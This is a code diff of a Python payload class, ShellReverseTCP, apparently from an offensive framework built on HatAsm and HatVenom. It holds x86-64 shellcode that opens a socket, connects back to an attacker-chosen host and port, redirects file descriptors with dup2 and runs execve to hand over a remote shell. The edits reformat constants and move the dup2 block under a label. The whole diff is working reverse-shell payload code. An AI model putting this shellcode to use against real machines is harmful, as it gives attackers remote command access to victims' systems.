@@ -43,13 +43,13 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
             push 0x29
             pop rax
             cdq
-            push 2
+            push 0x2
             pop rdi
-            push 1
+            push 0x1
             pop rsi
             syscall
 
-            xchg rax, rdi
+            xchg rdi, rax
             movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
             push rcx
             mov rsi, rsp
@@ -59,14 +59,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
             pop rax
             syscall
 
-            push 3
-            pop rsi
-            dec rsi
-            push 0x21
-            pop rax
-            syscall
-            
-            jne 0x1027
+            jne dup
             push 0x3b
             pop rax
             cdq
@@ -76,6 +69,14 @@ class ShellReverseTCP(HatAsm, HatVenom, Consts):
             push rdx
             push rdi
             mov rsi, rsp
+            syscall
+
+        dup:
+            push 0x3
+            pop rsi
+            dec rsi
+            push 0x21
+            pop rax
             syscall
         """
 
